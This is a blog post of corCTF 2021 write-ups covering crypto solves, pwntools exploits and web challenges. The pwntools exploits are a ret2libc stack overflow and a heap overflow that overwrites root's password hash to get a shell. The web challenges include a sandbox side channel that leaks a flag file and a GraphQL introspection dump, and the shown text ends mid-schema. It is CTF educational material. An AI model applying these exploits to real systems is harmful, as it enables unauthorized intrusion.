+++
title = "COR CTF 2021"
date = 2021-08-22

[taxonomies]
tags = ["ctf-writeups"]
+++

I competed with ret2rev and placed in 98th place!  I wrote these all in the last 20 minutes of the ctf and went to go get food so it's a little brief. 

<!-- more -->

# fibinary (crypto)

```text
Warmup your crypto skills with the superior number system!
```

We're provided two files -- an encryption script in python and an encrypted flag. 

### enc.py
```python
fib = [1, 1]
for i in range(2, 11):
	fib.append(fib[i - 1] + fib[i - 2])

def c2f(c):
	n = ord(c)
	b = ''
	for i in range(10, -1, -1):
		if n >= fib[i]:
			n -= fib[i]
			b += '1'
		else:
			b += '0'
	return b

flag = open('flag.txt', 'r').read()
enc = ''
for c in flag:
	enc += c2f(c) + ' '
with open('flag.enc', 'w') as f:
	f.write(enc.strip())
```
# flag.enc
```text
10000100100 10010000010 10010001010 10000100100 10010010010 10001000000 10100000000 10000100010 00101010000 10010010000 00101001010 10000101000 10000010010 00101010000 10010000000 10000101000 10000010010 10001000000 00101000100 10000100010 10010000100 00010101010 00101000100 00101000100 00101001010 10000101000 10100000100 00000100100
```

Each character is "encrypted" individually which means it's looking awfully tractable. We can engage in a little wholesome brute force to crack each character individually. 

```python
from z3 import *
from string import printable

fib = [1, 1]
for i in range(2, 11):
	fib.append(fib[i - 1] + fib[i - 2])

def brute(target):
	def c2f(c):
		n = ord(c)
		b = ''
		for i in range(10, -1, -1):
			if n >= fib[i]:
				n -= fib[i]
				b += '1'
			else:
				b += '0'
		return b
	for x in printable:
		if c2f(x) == target:
			return x


flag = open('flag.enc', 'r').read().split(" ")
for i in flag:
	char = brute(i)
	print(char,end="")
```
The flag is corctf{b4s3d_4nd_f1bp!113d}

# 4096 (crypto)

```text
I heard 4096 bit RSA is secure, so I encrypted the flag with it.
```

Well, it sure should be secure -- let's take a look at the provided files. 

### source.py
```python
from Crypto.Util.number import getPrime, bytes_to_long
from private import flag

def prod(lst):
	ret = 1
	for num in lst:
		ret *= num
	return ret

m = bytes_to_long(flag)
primes = [getPrime(32) for _ in range(128)]
n = prod(primes)
e = 65537
print(n)
print(pow(m, e, n))
```

### output.txt

```text
50630448182626893495464810670525602771527685838257974610483435332349728792396826591558947027657819590790590829841808151825744184405725893984330719835572507419517069974612006826542638447886105625739026433810851259760829112944769101557865474935245672310638931107468523492780934936765177674292815155262435831801499197874311121773797041186075024766460977392150443756520782067581277504082923534736776769428755807994035936082391356053079235986552374148782993815118221184577434597115748782910244569004818550079464590913826457003648367784164127206743005342001738754989548942975587267990706541155643222851974488533666334645686774107285018775831028090338485586011974337654011592698463713316522811656340001557779270632991105803230612916547576906583473846558419296181503108603192226769399675726201078322763163049259981181392937623116600712403297821389573627700886912737873588300406211047759637045071918185425658854059386338495534747471846997768166929630988406668430381834420429162324755162023168406793544828390933856260762963763336528787421503582319435368755435181752783296341241853932276334886271511786779019664786845658323166852266264286516275919963650402345264649287569303300048733672208950281055894539145902913252578285197293
15640629897212089539145769625632189125456455778939633021487666539864477884226491831177051620671080345905237001384943044362508550274499601386018436774667054082051013986880044122234840762034425906802733285008515019104201964058459074727958015931524254616901569333808897189148422139163755426336008738228206905929505993240834181441728434782721945966055987934053102520300610949003828413057299830995512963516437591775582556040505553674525293788223483574494286570201177694289787659662521910225641898762643794474678297891552856073420478752076393386273627970575228665003851968484998550564390747988844710818619836079384152470450659391941581654509659766292902961171668168368723759124230712832393447719252348647172524453163783833358048230752476923663730556409340711188698221222770394308685941050292404627088273158846156984693358388590950279445736394513497524120008211955634017212917792675498853686681402944487402749561864649175474956913910853930952329280207751998559039169086898605565528308806524495500398924972480453453358088625940892246551961178561037313833306804342494449584581485895266308393917067830433039476096285467849735814999851855709235986958845331235439845410800486470278105793922000390078444089105955677711315740050638
```

The issue, here, is that while it is indeed 4096 bits, it isn't a very well chosen 4096 bits. Direct factorization isn't usually useful when breaking RSA because the numbers involved are so large, but in this case we know that they aren't large -- every factor is bounded by 32 bits.  I used a neat tool called [yafu](https://github.com/DarkenCode/yafu) to factor it. 

<details>
<summary>Primes</summary>
<pre lang="text">
<code>
P10 = 4098491081
P10 = 4135004413
P10 = 3279018511
P10 = 2230630973
P10 = 3180301633
P10 = 2148630611
P10 = 4056085883
P10 = 2216411683
P10 = 2647129697
P10 = 3278196319
P10 = 2959325459
P10 = 2752963847
P10 = 2719924183
P10 = 2657405087
P10 = 2963383867
P10 = 3130133681
P10 = 3335574511
P10 = 3539958743
P10 = 3648309311
P10 = 3012495907
P10 = 4235456317
P10 = 2240170147
P10 = 2293226687
P10 = 3716991893
P10 = 3035438359
P10 = 4152726959
P10 = 3961738709
P10 = 2223202649
P10 = 2424270803
P10 = 3398567593
P10 = 3959814431
P10 = 2459187103
P10 = 2371079143
P10 = 2575495753
P10 = 2932152359
P10 = 3865448239
P10 = 4205028467
P10 = 2733527227
P10 = 3991834969
P10 = 4140261491
P10 = 4252196909
P10 = 3646337561
P10 = 4218138251
P10 = 3854175641
P10 = 2491570349
P10 = 4091945483
P10 = 2322142411
P10 = 3943871257
P10 = 3522596999
P10 = 3346647649
P10 = 3760232953
P10 = 4227099257
P10 = 3013564231
P10 = 2525697263
P10 = 3684423151
P10 = 3083881387
P10 = 3978832967
P10 = 3589083991
P10 = 3625437121
P10 = 4045323871
P10 = 2710524571
P10 = 2444333767
P10 = 2695978183
P10 = 3380851417
P10 = 2602521199
P10 = 2944751701
P10 = 2572542211
P10 = 2753147143
P10 = 3638373857
P10 = 3789253133
P10 = 2661720221
P10 = 3488338697
P10 = 2858807113
P10 = 3833824031
P10 = 3464370241
P10 = 2682518317
P10 = 3923208001
P10 = 2772696307
P10 = 2746638019
P10 = 2724658201
P10 = 3291377941
P10 = 3303691121
P10 = 3686523713
P10 = 3417563069
P10 = 3994425601
P10 = 2824169389
P10 = 3200434847
P10 = 3721186793
P10 = 3359249393
P10 = 2436598001
P10 = 2278427881
P10 = 2707095227
P10 = 2949007619
P10 = 2510750149
P10 = 3057815377
P10 = 2703629041
P10 = 4141964923
P10 = 2388797093
P10 = 2365186141
P10 = 4276173893
P10 = 2854321391
P10 = 3177943303
P10 = 3487902133
P10 = 3174322859
P10 = 2841115943
P10 = 3860554891
P10 = 3285444073
P10 = 2636069911
P10 = 3319529377
P10 = 3411506629
P10 = 2672301743
P10 = 3238771411
P10 = 3833706949
P10 = 3811207403
P10 = 4073647147
P10 = 3623581037
P10 = 3453863503
P10 = 3056689019
P10 = 3861767519
P10 = 3986329331
P10 = 3941016503
P10 = 3789746923
P10 = 3228764447
P10 = 4198942673
P10 = 4270521797
P10 = 4006267823
P10 = 2157385673
P10 = 2944722127
</code>
</pre>
</details>

With the primes in hand, we can just decrypt it as usual. Originally I used sympy.totient to solve for the totient (took a couple minutes but worked), but I realized after that the constant calculation we use in RSA with two primes `(P-1)(Q-1)` is correct for the product of any number of primes, so I used that in my final solution. 

```python
import gmpy
from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes

N = 50630448182626893495464810670525602771527685838257974610483435332349728792396826591558947027657819590790590829841808151825744184405725893984330719835572507419517069974612006826542638447886105625739026433810851259760829112944769101557865474935245672310638931107468523492780934936765177674292815155262435831801499197874311121773797041186075024766460977392150443756520782067581277504082923534736776769428755807994035936082391356053079235986552374148782993815118221184577434597115748782910244569004818550079464590913826457003648367784164127206743005342001738754989548942975587267990706541155643222851974488533666334645686774107285018775831028090338485586011974337654011592698463713316522811656340001557779270632991105803230612916547576906583473846558419296181503108603192226769399675726201078322763163049259981181392937623116600712403297821389573627700886912737873588300406211047759637045071918185425658854059386338495534747471846997768166929630988406668430381834420429162324755162023168406793544828390933856260762963763336528787421503582319435368755435181752783296341241853932276334886271511786779019664786845658323166852266264286516275919963650402345264649287569303300048733672208950281055894539145902913252578285197293
c = 15640629897212089539145769625632189125456455778939633021487666539864477884226491831177051620671080345905237001384943044362508550274499601386018436774667054082051013986880044122234840762034425906802733285008515019104201964058459074727958015931524254616901569333808897189148422139163755426336008738228206905929505993240834181441728434782721945966055987934053102520300610949003828413057299830995512963516437591775582556040505553674525293788223483574494286570201177694289787659662521910225641898762643794474678297891552856073420478752076393386273627970575228665003851968484998550564390747988844710818619836079384152470450659391941581654509659766292902961171668168368723759124230712832393447719252348647172524453163783833358048230752476923663730556409340711188698221222770394308685941050292404627088273158846156984693358388590950279445736394513497524120008211955634017212917792675498853686681402944487402749561864649175474956913910853930952329280207751998559039169086898605565528308806524495500398924972480453453358088625940892246551961178561037313833306804342494449584581485895266308393917067830433039476096285467849735814999851855709235986958845331235439845410800486470278105793922000390078444089105955677711315740050638
primes = [int(x.split(" = ")[1]) for x in open("primes.txt","r").read().split("\n")]

def prod(lst):
	ret = 1
	for num in lst:
		ret *= num
	return ret
phi = prod([x-1 for x in primes])
d = gmpy.invert(65537, phi)

print(long_to_bytes(pow(c, d, N)))
```

Running that gives us the flag corctf{to0_m4ny_pr1m3s55_63aeea37a6b3b22f}

# chainblock (pwn)

```text
I made a chain of blocks!
nc pwn.be.ax 5000
```

We're provided source, a binary, and ld/libc. 

### chainblock.c

```c
#include <stdio.h>

char* name = "Techlead";
int balance = 100000000;

void verify() {
	char buf[255];
	printf("Please enter your name: ");
	gets(buf);

	if (strcmp(buf, name) != 0) {
		printf("KYC failed, wrong identity!\n");
		return;
	}

	printf("Hi %s!\n", name);
	printf("Your balance is %d chainblocks!\n", balance);
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);

	printf("      ___           ___           ___                       ___     \n");
	printf("     /\\  \\         /\\__\\         /\\  \\          ___        /\\__\\    \n");
	printf("    /::\\  \\       /:/  /        /::\\  \\        /\\  \\      /::|  |   \n");
	printf("   /:/\\:\\  \\     /:/__/        /:/\\:\\  \\       \\:\\  \\    /:|:|  |   \n");
	printf("  /:/  \\:\\  \\   /::\\  \\ ___   /::\\~\\:\\  \\      /::\\__\\  /:/|:|  |__ \n");
	printf(" /:/__/ \\:\\__\\ /:/\\:\\  /\\__\\ /:/\\:\\ \\:\\__\\  __/:/\\/__/ /:/ |:| /\\__\\\n");
	printf(" \\:\\  \\  \\/__/ \\/__\\:\\/:/  / \\/__\\:\\/:/  / /\\/:/  /    \\/__|:|/:/  /\n");
	printf("  \\:\\  \\            \\::/  /       \\::/  /  \\::/__/         |:/:/  / \n");
	printf("   \\:\\  \\           /:/  /        /:/  /    \\:\\__\\         |::/  /  \n");
	printf("    \\:\\__\\         /:/  /        /:/  /      \\/__/         /:/  /   \n");
	printf("     \\/__/         \\/__/         \\/__/                     \\/__/    \n");
	printf("      ___           ___       ___           ___           ___     \n");
	printf("     /\\  \\         /\\__\\     /\\  \\         /\\  \\         /\\__\\    \n");
	printf("    /::\\  \\       /:/  /    /::\\  \\       /::\\  \\       /:/  /    \n");
	printf("   /:/\\:\\  \\     /:/  /    /:/\\:\\  \\     /:/\\:\\  \\     /:/__/     \n");
	printf("  /::\\~\\:\\__\\   /:/  /    /:/  \\:\\  \\   /:/  \\:\\  \\   /::\\__\\____ \n");
	printf(" /:/\\:\\ \\:|__| /:/__/    /:/__/ \\:\\__\\ /:/__/ \\:\\__\\ /:/\\:::::\\__\\\n");
	printf(" \\:\\~\\:\\/:/  / \\:\\  \\    \\:\\  \\ /:/  / \\:\\  \\  \\/__/ \\/_|:|~~|~   \n");
	printf("  \\:\\ \\::/  /   \\:\\  \\    \\:\\  /:/  /   \\:\\  \\          |:|  |    \n");
	printf("   \\:\\/:/  /     \\:\\  \\    \\:\\/:/  /     \\:\\  \\         |:|  |    \n");
	printf("    \\::/__/       \\:\\__\\    \\::/  /       \\:\\__\\        |:|  |    \n");
	printf("     ~~            \\/__/     \\/__/         \\/__/         \\|__|    \n");
	printf("\n\n");
	printf("----------------------------------------------------------------------------------");
	printf("\n\n");

	printf("Welcome to Chainblock, the world's most advanced chain of blocks.\n\n");

	printf("Chainblock is a unique company that combines cutting edge cloud\n");
	printf("technologies with high tech AI powered machine learning models\n");
	printf("to create a unique chain of blocks that learns by itself!\n\n");

	printf("Chainblock is also a highly secure platform that is unhackable by design.\n");
	printf("We use advanced technologies like NX bits and anti-hacking machine learning models\n");
	printf("to ensure that your money is safe and will always be safe!\n\n");

	printf("----------------------------------------------------------------------------------");
	printf("\n\n");

	printf("For security reasons we require that you verify your identity.\n");

	verify();
}
```

The vulnerability is in the function verify, in the gets invocation. There isn't any useful code for shell or flag reading inside the binary, but we can override the return pointer and it's linked to libc so ret2libc is an option. I did a two step exploit which leaked a pointer into libc and returned back into the vulnerable function, and then using the calculated libc address to return onto a one_gadget. 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("chainblock")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

POP_RDI_RET = p64(0x401493)

context.binary = exe
context.terminal = "kitty"
def conn():
    if args.REMOTE:
        return remote("pwn.be.ax", 5000)
    elif args.GDB:
        return gdb.debug([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})


def main():
    r = conn()

    payload = flat({
        264: POP_RDI_RET,
        272: p64(exe.symbols['__libc_start_main']),
        280: p64(exe.plt['puts']),
        288: p64(exe.symbols['verify']),
    })

    r.sendline(payload)

    r.recvuntil(b"identity!\n")
    libc_start_address = int.from_bytes(r.recvline().rstrip(), byteorder="little")
    libc.address = libc_start_address - libc.sym["__libc_start_main"]
    log.info("Address of libc %s " % hex(libc.address))

    payload = flat({
        264: p64(libc.address + 0xde78f) # one_gadget
    })

    r.sendline(payload)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

The flag is corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}

# cshell (pwn)

```text
My friend Hevr thinks I can't code, so I decided to prove him wrong by making a restricted shell in which he is unable to play squad. I must add that my programming skills are very cache money...

nc pwn.be.ax 5001
```

We're provided a binary and source. 

### Cshell.c
```c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <crypt.h>

//gcc Cshell.c -static -lcrypt -o Cshell
struct users {
	char name[8];
	char passwd[35];
};

struct tracker{
	struct tracker *next;
	struct users *ptr;
	char name[8];
	long int id;
};

char * alex_buff;
char * Charlie_buff;
char * Johnny_buff;
char * Eric_buff;

struct users *user;
struct users *root;

struct tracker *root_t;
struct tracker *user_t;

char *username[8];
char *userbuffer;
int uid=1000;
int length;
char salt[5] = "1337\0";
char *hash;
void setup(){
	char password_L[33];
	puts("Welcome to Cshell, a very restricted shell.\nPlease create a profile.");
	printf("Enter a username up to 8 characters long.\n> ");
	scanf("%8s",username);
	printf("Welcome to the system %s, you are our 3rd user. We used to have more but some have deleted their accounts.\nCreate a password.\n> ",username);
	scanf("%32s",&password_L);
	hash = crypt(password_L,salt);
	printf("How many characters will your bio be (200 max)?\n> ");
	scanf("%d",&length);
	userbuffer = malloc(length + 8);
	printf("Great, please type your bio.\n> ");
	getchar();
	fgets((userbuffer + 8),201,stdin);
}

void logout(){
	fflush(stdin);
	getchar();
	struct tracker *ptr;
	printf("Username:");
	char username_l[9];
	char password_l[32];
	char *hash;
	scanf("%8s",username_l);
	for (ptr = root_t; ptr != NULL; ptr = root_t->next) {


        if (strcmp(ptr->name, username_l) == 0) {
		printf("Password:");
	    scanf("%32s",password_l);
	    hash = crypt(password_l,salt);
	    if (strcmp(hash,ptr->ptr->passwd) == 0){
		    strcpy(username,ptr->name);
		    uid = ptr->id;
		    puts("Authenticated!");
		    menu();
	    }
	    else{
		    puts("Incorrect");
		    logout();
	    }
			 
        }
	else
	{
		if (ptr->next==0)
		{
			puts("Sorry no users with that name.");
			logout();
		}
	}
    }
}
void whoami(){
	printf("%s, uid: %d\n",username,uid);
	menu();
}
void bash(){

	if (uid == 0){
		system("bash");
	}
	else 
	{
		puts("Who do you think you are?");
		exit(0);
	}

}

void squad(){
	puts("..");
	menu();
}

void banner(){

puts("       /\\");
puts("      {.-}");
puts("     ;_.-'\\");
puts("    {    _.}_");
puts("    \\.-' /  `,");
puts("     \\  |    /");
puts("      \\ |  ,/");
puts("       \\|_/");
puts("");
}
void menu(){
	puts("+----------------------+");
	puts("|        Commands      |");
	puts("+----------------------+");
	puts("| 1. logout            |");
	puts("| 2. whoami            |");
	puts("| 3. bash (ROOT ONLY!) |");
	puts("| 4. squad             |");
	puts("| 5. exit              |");
	puts("+----------------------+");
	int option;
	printf("Choice > ");
	scanf("%i",&option);
	switch(option){
		case 1:
			logout();
		case 2:
			whoami();
		case 3:
			bash();
		case 4:
			squad();
		case 5:
			exit(0);
		default:
			puts("[!] invalid choice \n");
			break;
	}
}
void history(){
	alex_buff = malloc(0x40);
	char alex_data[0x40] = "Alex\nJust a user on this system.\0";
	char Johnny[0x50] = "Johnny\n Not sure why I am a user on this system.\0";
	char Charlie[0x50] ="Charlie\nI do not trust the security of this program...\0";
	char Eric[0x60] = "Eric\nThis is one of the best programs I have ever used!\0";
	strcpy(alex_buff,alex_data);
	Charlie_buff = malloc(0x50);
	strcpy(Charlie_buff,Charlie);
	Johnny_buff = malloc(0x60);
	strcpy(Johnny_buff,Johnny);
	Eric_buff = malloc(0x80);
	strcpy(Eric_buff,Eric);
	free(Charlie_buff);
	free(Eric_buff);
}

int main(){
	setvbuf(stdout, 0 , 2 , 0);
	setvbuf(stdin, 0 , 2 , 0);
	root_t = malloc(sizeof(struct tracker));
	user_t = malloc(sizeof(struct tracker));
	history();
	banner();
	user = malloc(sizeof(struct users )* 4);
	root = user + 1;
	strcpy(user->name,"tempname");
	strcpy(user->passwd,"placeholder");
	strcpy(root->name,"root");
	strcpy(root->passwd,"guessme:)");
	strcpy(root_t->name,"root");
	root_t->ptr = root;
	root_t->id = 0;
	root_t->next = user_t;
	setup();
	strcpy(user->name,username);
	strcpy(user->passwd,hash);
	strcpy(user_t->name,username);
	user_t->id=1000;
	user_t->ptr = user;
	user_t->next = NULL;
	menu();
	return 0;
}
```

So, the first thing I noted here was that we don't need to exploit for code execution. If we can set uid to 0, it'll just give us a shell. The vulnerability is in the setup function. It asks for the length of our bio buffer, allocates a chunk of that size, and then reads 201 bytes into it for a fairly hefty heap overflow. The issue is that it's essentially the last heap chunk allocated so there isn't anything useful afterwards. We can force it to allocate an earlier chunk by taking advantage of some libc malloc behavior -- that it will reuse previously freed chunks of matching sizes. The heap layout around that area looks something like Alex -> Charlie -> Eric -> User -> Root. Both Charlie and Eric are freed chunks, which means we can get the setup to allocate those chunks again and overflow. At this point we can overwrite the saved password of root, log into root, and then ask politely for a shell. 


```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("Cshell")

context.binary = exe
context.terminal = "kitty"
def conn():
    if args.REMOTE:
        return remote("pwn.be.ax", 5001)
    elif args.GDB:
        return gdb.debug([exe.path])
    else:
        return process([exe.path])


def main():
    r = conn()

    payload = flat({
        187: b"13iAJxIb3oOPs" # "hi" hashed
    })

    r.sendline(b"abcd")
    r.sendline(b"hi")
    r.sendline(b"120") # reuse a previous freed alloc
    r.send(payload)

    r.sendline(b"1")
    r.sendline(b"root")
    r.sendline(b"hi")
    r.sendline(b"3")
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

The flag is corctf{tc4ch3_r3u5e_p1u5_0v3rfl0w_equ4l5_r007}

### yeetcode (misc)

```text
Brush up on your coding skills and ace your next interview with YeetCode! Flag is at ./flag.txt

https://yeetcode.be.ax
```

We're provided all the source and a docker file but I've just included the main server file for brevity. 

```python
from flask import Flask, render_template, request, session
import random, epicbox, os

# docker pull 

epicbox.configure(
    profiles=[
        epicbox.Profile('python', 'python:3.9.6-alpine')
    ]
)

app = Flask(__name__)
app.secret_key = os.urandom(16)
flag = open('flag.txt').read()

@app.route('/')
def yeet():
    return render_template('yeet.html')

@app.route('/yeet')
def yeetyeet():
    return render_template('yeetyeet.html')

@app.route('/yeetyeet', methods=['POST'])
def yeetyeetyeet():
    if 'run' in session and session['run']:
        return {'error': True, 'msg': 'You already have code running, please wait for it to finish.'}
    session['run'] = True
    code = request.data
    tests = [(2, 3, 5), (5, 7, 12)]
    for _ in range(8):
        a, b = random.randint(1, 100), random.randint(1, 100)
        tests.append((a, b, a + b))
    # print(code)
    cmd = 'from code import f\n'
    outputs = []
    for case in tests:
        a, b, ans = case
        cmd += f'print(f({a}, {b}))\n'
        outputs.append(str(ans))

    files = [{'name': 'flag.txt', 'content': flag.encode()}, {'name': 'code.py', 'content': code}]
    limits = {'cputime': 1, 'memory': 16}
    result = epicbox.run('python', command='python3', stdin=cmd, files=files, limits=limits)

    if result['exit_code'] != 0:
        session['run'] = False
        return {'error': True, 'msg': 'Oops! Your code has an error in it. Please try again.'}
    actual = result['stdout'].decode().strip().split('\n')
    print(actual)
    print(outputs)
    passes = 0
    fails = 0
    for i in range(len(outputs)):
        if outputs[i] == actual[i]:
            passes += 1
        else:
            fails += 1

    session['run'] = False
    return {'error': False, 'p': passes, 'f': fails}

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
```

We provided code to run in a sandbox which has access to a flag file, but we don't have access to any response except test case passes and fails. I have no idea if this sandbox allows for network and honestly I didn't think to check so instead you get a good ol binary search (the code for which i stole off the internet bc lazy). The function which is supposed to take two args and return the sum of them, so it's trivial to make it pass when needed and then we just need a condition for our binary search. 

```python
import requests
from bisect import bisect_left
# corctf{1m4g1n3_cp_g0lf_6a318dfe}


def get_index(idx, val):
	code = """
ch = open("flag.txt","r").read()[%s]
def f(a, b):
	if ord(ch) <= %s:
		return a + b
	else: 
		return False
	""" % (idx, val)
	headers = {
		'Content-Type': 'text/plain;charset=UTF-8'
	}
	url = "https://yeetcode.be.ax/yeetyeet"

	r = requests.post(url,headers=headers, data = code)
	return r.json()["p"] != 10


def generic_bisect(idx, lo=0, hi=None):
    if lo < 0:
        raise ValueError('lo must be non-negative')
    if hi is None:
        hi = 127
    while lo < hi:
        mid = (lo+hi)//2
        if get_index(idx, mid) == 2: return mid
        elif get_index(idx, mid) == 1: lo = mid+1
        else: hi = mid
    return lo

flag = ""
while True:
	flag += chr(generic_bisect(len(flag)))
	print(flag)
```

I went off to go get dinner and came back to the flag, corctf{1m4g1n3_cp_g0lf_6a318dfe}

# devme (web)

```text
an ex-google, ex-facebook tech lead recommended me this book!

https://devme.be.ax
```

No source provided here; I just clicked around until I found a form which showed me there was an exposed graphql endpoint. I grabbed a query to enumerate the schema from [the internet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#extract-data)

<details>
<summary>Schema</summary>
<pre lang="json">
<code>
	{
    "data": {
        "__schema": {
            "queryType": {
                "name": "Query"
            },
            "mutationType": {
                "name": "Mutation"
            },
            "types": [
                {
                    "kind": "OBJECT",
                    "name": "Query",
                    "description": null,
                    "fields": [
                        {
                            "name": "users",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "LIST",
                                    "name": null,
                                    "ofType": {
                                        "kind": "OBJECT",
                                        "name": "User",
                                        "ofType": null
                                    }
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "flag",
                            "description": null,
                            "args": [
                                {
                                    "name": "token",
                                    "description": null,
                                    "type": {
                                        "kind": "NON_NULL",
                                        "name": null,
                                        "ofType": {
                                            "kind": "SCALAR",
                                            "name": "String",
                                            "ofType": null
                                        }
                                    },
                                    "defaultValue": null
                                }
                            ],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "SCALAR",
                                    "name": "String",
                                    "ofType": null
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        }
                    ],
                    "inputFields": null,
                    "interfaces": [],
                    "enumValues": null,
                    "possibleTypes": null
                },
                {
                    "kind": "SCALAR",
                    "name": "String",
                    "description": "The `String` scalar type represents textual data, represented as UTF-8 character sequences. The String type is most often used by GraphQL to represent free-form human-readable text.",
                    "fields": null,
                    "inputFields": null,
                    "interfaces": null,
                    "enumValues": null,
                    "possibleTypes": null
                },
                {
                    "kind": "OBJECT",
                    "name": "Mutation",
                    "description": null,
                    "fields": [
                        {
                            "name": "createUser",
                            "description": null,
                            "args": [
                                {
                                    "name": "email",
                                    "description": null,
                                    "type": {
                                        "kind": "NON_NULL",
                                        "name": null,
                                        "ofType": {
                                            "kind": "SCALAR",
                                            "name": "String",
                                            "ofType": null
                                        }
                                    },
                                    "defaultValue": null
                                }
                            ],
                            "type": {
                                "kind": "OBJECT",
                                "name": "User",
                                "ofType": null
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        }
                    ],
                    "inputFields": null,
                    "interfaces": [],
                    "enumValues": null,
                    "possibleTypes": null
                },
                {
                    "kind": "OBJECT",
                    "name": "User",
                    "description": null,
                    "fields": [
                        {
                            "name": "token",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "SCALAR",
                                    "name": "String",
                                    "ofType": null
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "username",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "SCALAR",
                                    "name": "String",
                                    "ofType": null
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        }
                    ],
                    "inputFields": null,
                    "interfaces": [],
                    "enumValues": null,
                    "possibleTypes": null
                },
                {
                    "kind": "SCALAR",
                    "name": "Boolean",
                    "description": "The `Boolean` scalar type represents `true` or `false`.",
                    "fields": null,
                    "inputFields": null,
                    "interfaces": null,
                    "enumValues": null,
                    "possibleTypes": null
                },
                {
                    "kind": "OBJECT",
                    "name": "__Schema",
                    "description": "A GraphQL Schema defines the capabilities of a GraphQL server. It exposes all available types and directives on the server, as well as the entry points for query, mutation, and subscription operations.",
                    "fields": [
                        {
                            "name": "description",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "SCALAR",
                                "name": "String",
                                "ofType": null
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "types",
                            "description": "A list of all types supported by this server.",
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "LIST",
                                    "name": null,
                                    "ofType": {
                                        "kind": "NON_NULL",
                                        "name": null,
                                        "ofType": {
                                            "kind": "OBJECT",
                                            "name": "__Type",
                                            "ofType": null
                                        }
                                    }
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "queryType",
                            "description": "The type that query operations will be rooted at.",
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "OBJECT",
                                    "name": "__Type",
                                    "ofType": null
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "mutationType",
                            "description": "If this server supports mutation, the type that mutation operations will be rooted at.",
                            "args": [],
                            "type": {
                                "kind": "OBJECT",
                                "name": "__Type",
                                "ofType": null
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "subscriptionType",
                            "description": "If this server support subscription, the type that subscription operations will be rooted at.",
                            "args": [],
                            "type": {
                                "kind": "OBJECT",
                                "name": "__Type",
                                "ofType": null
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "directives",
                            "description": "A list of all directives supported by this server.",
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "LIST",
                                    "name": null,
                                    "ofType": {
                                        "kind": "NON_NULL",
                                        "name": null,
                                        "ofType": {
                                            "kind": "OBJECT",
                                            "name": "__Directive",
                                            "ofType": null
                                        }
                                    }
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        }
                    ],
                    "inputFields": null,
                    "interfaces": [],
                    "enumValues": null,
                    "possibleTypes": null
                },
                {
                    "kind": "OBJECT",
                    "name": "__Type",
                    "description": "The fundamental unit of any GraphQL Schema is the type. There are many kinds of types in GraphQL as represented by the `__TypeKind` enum.\n\nDepending on the kind of a type, certain fields describe information about that type. Scalar types provide no information beyond a name, description and optional `specifiedByUrl`, while Enum types provide their values. Object and Interface types provide the fields they describe. Abstract types, Union and Interface, provide the Object types possible at runtime. List and NonNull types compose other types.",
                    "fields": [
                        {
                            "name": "kind",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "ENUM",
                                    "name": "__TypeKind",
                                    "ofType": null
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "name",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "SCALAR",
                                "name": "String",
                                "ofType": null
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "description",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "SCALAR",
                                "name": "String",
                                "ofType": null
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "specifiedByUrl",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "SCALAR",
                                "name": "String",
                                "ofType": null
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "fields",
                            "description": null,
                            "args": [
                                {
                                    "name": "includeDeprecated",
                                    "description": null,
                                    "type": {
                                        "kind": "SCALAR",
                                        "name": "Boolean",
                                        "ofType": null
                                    },
                                    "defaultValue": "false"
                                }
                            ],
                            "type": {
                                "kind": "LIST",
                                "name": null,
                                "ofType": {
                                    "kind": "NON_NULL",
                                    "name": null,
                                    "ofType": {
                                        "kind": "OBJECT",
                                        "name": "__Field",
                                        "ofType": null
                                    }
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
